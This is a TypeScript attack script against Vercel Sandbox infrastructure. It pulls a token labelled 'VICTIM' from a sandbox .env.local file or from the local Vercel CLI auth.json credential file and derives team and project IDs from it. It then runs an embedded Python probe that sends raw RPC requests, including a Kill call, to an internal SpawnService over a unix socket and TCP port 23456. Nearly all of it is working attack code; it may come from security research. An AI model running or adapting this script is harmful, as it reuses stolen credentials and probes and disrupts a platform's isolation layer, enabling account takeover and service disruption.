import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
timeout 15 python3 << 'PYEOF'
import socket

def rpc_unix(path, method, body=b'{}', ctype='application/json'):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect(path)
    req = (b'POST /vercel.sandbox.spawn.v1.SpawnService/' + method + b' HTTP/1.1\r\n'
           b'Host: localhost\r\nContent-Type: ' + ctype.encode() + b'\r\n'
           b'Connect-Protocol-Version: 1\r\nContent-Length: ' + str(len(body)).encode() + b'\r\n\r\n') + body
    s.sendall(req)
    out = b''
    try:
        while True:
            c = s.recv(8192)
            if not c: break
            out += c
    except socket.timeout: pass
    s.close()
    return out

def rpc_tcp(port, method, body=b'{}', ctype='application/json'):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect(('127.0.0.1', port))
    req = (b'POST /vercel.sandbox.spawn.v1.SpawnService/' + method + b' HTTP/1.1\r\n'
           b'Host: localhost\r\nContent-Type: ' + ctype.encode() + b'\r\n'
           b'Connect-Protocol-Version: 1\r\nContent-Length: ' + str(len(body)).encode() + b'\r\n\r\n') + body
    s.sendall(req)
    out = b''
    try:
        while True:
            c = s.recv(8192)
            if not c: break
            out += c
    except socket.timeout: pass
    s.close()
    return out

for target, cb in [('unix init.sock', rpc_unix), ('tcp 23456', lambda p,m,b='{}',c='application/json': rpc_tcp(23456,m,b,c))]:
    for method in [b'Ping', b'Kill']:
        try:
            if target.startswith('unix'):
                r = rpc_unix('/run/vercel/share/init.sock', method)
            else:
                r = rpc_tcp(23456, method)
            print(target, method.decode(), '->', repr(r[:300]))
        except Exception as e:
            print(target, method.decode(), 'ERR', e)
PYEOF
echo "===DONE==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 30_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });